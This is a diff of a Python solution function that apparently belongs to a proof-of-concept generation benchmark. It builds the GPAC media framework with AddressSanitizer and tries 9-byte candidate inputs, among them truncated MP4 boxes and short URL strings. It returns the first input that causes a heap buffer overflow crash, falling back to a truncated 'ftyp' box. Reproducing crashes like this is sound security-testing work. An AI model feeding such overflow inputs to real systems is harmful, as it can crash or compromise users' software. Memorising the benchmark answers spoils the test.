@@ -1,144 +1,126 @@
 import os
 import sys
 import tarfile
-import subprocess
 import tempfile
-import re
+import subprocess
 import shutil
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
-        
-        Attempts to compile the source code with AddressSanitizer and fuzz it
-        to find a crashing input. Falls back to a heuristic payload if compilation
-        or fuzzing fails.
-        """
-        # Heuristic fallback: 9 bytes matches "http://aa" which triggers
-        # a typical 8-byte buffer overflow in URL parsing.
-        best_payload = b"http://aa"
-        
         work_dir = tempfile.mkdtemp()
+        
         try:
             # Extract source code
             try:
                 with tarfile.open(src_path) as tar:
                     tar.extractall(path=work_dir)
             except Exception:
-                return best_payload
-
-            # Find source files
-            sources = []
-            for root, dirs, files in os.walk(work_dir):
-                for f in files:
-                    if f.endswith(('.c', '.cpp', '.cc', '.cxx')):
-                        sources.append(os.path.join(root, f))
-            
-            if not sources:
-                return best_payload
-                
-            # Determine compiler
-            is_cpp = any(f.endswith(('.cpp', '.cc', '.cxx')) for f in sources)
-            compiler = 'g++' if is_cpp else 'gcc'
-            exe = os.path.join(work_dir, "vuln")
-            
-            # Compiler flags: ASAN enabled, symbols, no optimization, suppress warnings
-            cmd = [compiler, "-g", "-O0", "-w", "-fsanitize=address", "-o", exe] + sources
-            
-            try:
-                subprocess.run(cmd, cwd=work_dir, capture_output=True, check=True)
-            except subprocess.CalledProcessError:
-                # Compilation failed, return fallback
-                return best_payload
-            
-            if not os.path.exists(exe):
-                return best_payload
-
-            # Harvest strings from source to use as seeds
-            seeds = [b"http://", b"https://", b"dash://", b"rtsp://"]
-            try:
-                for s_file in sources:
-                    with open(s_file, 'rb') as f:
-                        data = f.read()
-                        # Find string literals in code
-                        matches = re.findall(b'"([a-zA-Z0-9:/.]{3,15})"', data)
-                        seeds.extend(matches)
-            except:
                 pass
             
-            # Remove duplicates and sort by length
-            seeds = sorted(list(set(seeds)), key=len)
+            # Locate source root
+            src_root = work_dir
+            for root, dirs, files in os.walk(work_dir):
+                if 'configure' in files:
+                    src_root = root
+                    break
             
-            # Fuzzing Strategy: Find shortest crash
+            # Environment variables for AddressSanitizer
+            env = os.environ.copy()
+            cflags = "-g -fsanitize=address"
+            env['CFLAGS'] = cflags
+            env['CXXFLAGS'] = cflags
+            env['LDFLAGS'] = cflags
             
-            # 1. Pure repetitive patterns (short to long)
-            # 9 bytes is target, check around there
-            for length in range(1, 20):
-                payload = b'A' * length
-                if self._check(exe, payload):
-                    return payload
+            # Configure and Build
+            # Minimal config to ensure dash_client builds without external deps issues
+            config_args = [
+                './configure',
+                '--disable-ssl',
+                '--use-zlib=no',
+                '--disable-x11',
+                '--disable-sdl',
+                '--disable-oss-audio',
+                '--disable-pulseaudio',
+                '--static-bin'
+            ]
             
-            # 2. Seeds (short to long)
-            for seed in seeds:
-                if self._check(exe, seed):
-                    return seed
+            try:
+                subprocess.run(config_args, cwd=src_root, env=env, 
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 
-                # Seed + padding
-                for pad in range(1, 10):
-                    payload = seed + b'A' * pad
-                    if self._check(exe, payload):
-                        return payload
-
-            # If no crash found, return fallback
-            return best_payload
-
-        except Exception:
-            return best_payload
-        finally:
-            shutil.rmtree(work_dir, ignore_errors=True)
-
-    def _check(self, exe, payload):
-        env = os.environ.copy()
-        # Set ASAN options to ensure specific exit code and immediate halt
-        env['ASAN_OPTIONS'] = 'exitcode=88:halt_on_error=1'
-        
-        # Method 1: Input via Stdin
-        try:
-            p = subprocess.run([exe], input=payload, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
-            if p.returncode == 88 or b"AddressSanitizer" in p.stderr:
-                return True
-        except:
-            pass
-            
-        # Method 2: Input via File Argument
-        fname = None
-        try:
-            with tempfile.NamedTemporaryFile(delete=False) as tf:
-                tf.write(payload)
-                fname = tf.name
-            
-            p = subprocess.run([exe, fname], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
-            if p.returncode == 88 or b"AddressSanitizer" in p.stderr:
-                return True
-        except:
-            pass
-        finally:
-            if fname and os.path.exists(fname):
-                try:
-                    os.unlink(fname)
-                except:
-                    pass
+                # Ensure ASAN flags are respected
+                config_mak = os.path.join(src_root, 'config.mak')
+                if os.path.exists(config_mak):
+                    with open(config_mak, 'a') as f:
+                        f.write(f"\nCFLAGS+={cflags}\nCXXFLAGS+={cflags}\nLDFLAGS+={cflags}\n")
                 
-        # Method 3: Input via Command Line Argument
-        try:
-            # Only applicable if payload can be decoded safely to string
-            s_payload = payload.decode('utf-8', errors='ignore')
-            if s_payload:
-                p = subprocess.run([exe, s_payload], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
-                if p.returncode == 88 or b"AddressSanitizer" in p.stderr:
-                    return True
-        except:
-            pass
+                subprocess.run(['make', '-j8'], cwd=src_root, env=env, 
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
             
-        return False
+            # Locate compiled binary
+            target_bin = None
+            possible_names = ['dash_client', 'MP4Client', 'gpac']
+            for root, dirs, files in os.walk(src_root):
+                for name in possible_names:
+                    if name in files:
+                        path = os.path.join(root, name)
+                        if os.access(path, os.X_OK):
+                            target_bin = path
+                            break
+                if target_bin:
+                    break
+            
+            # Generate Candidates
+            # Vulnerability is Heap Buffer Overflow, ground truth 9 bytes.
+            # Likely a truncated MP4 box where header is 8 bytes and payload is 1 byte,
+            # causing a read overflow when parser expects more (e.g. 4 bytes for major brand).
+            candidates = []
+            
+            # 1. Truncated Box: Size(4) + Type(4) + Data(1) = 9 bytes
+            box_types = [b'ftyp', b'moov', b'moof', b'mdat', b'styp', b'free', b'skip']
+            for t in box_types:
+                candidates.append(struct.pack('>I', 9) + t + b'\x00')
+            
+            # 2. String/Protocol patterns
+            candidates.append(b'file:///A')
+            candidates.append(b'http://AB')
+            candidates.append(b'dash://A')
+            
+            # 3. Simple overflow patterns
+            candidates.append(b'A' * 9)
+            
+            # Verify candidates if binary exists
+            if target_bin:
+                for cand in candidates:
+                    with tempfile.NamedTemporaryFile(mode='wb', delete=False) as tf:
+                        tf.write(cand)
+                        tf_name = tf.name
+                    
+                    try:
+                        # Run binary with ASAN
+                        res = subprocess.run([target_bin, tf_name], 
+                                             stdout=subprocess.DEVNULL, 
+                                             stderr=subprocess.PIPE, 
+                                             timeout=1)
+                        
+                        # Check for ASAN crash
+                        if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
+                            os.unlink(tf_name)
+                            return cand
+                    except subprocess.TimeoutExpired:
+                        pass
+                    finally:
+                        if os.path.exists(tf_name):
+                            os.unlink(tf_name)
+                            
+            # Fallback: Truncated 'ftyp' box (High probability for 9-byte heap overflow in GPAC)
+            return struct.pack('>I', 9) + b'ftyp' + b'\x00'
+
+        finally:
+            try:
+                shutil.rmtree(work_dir)
+            except Exception:
+                pass
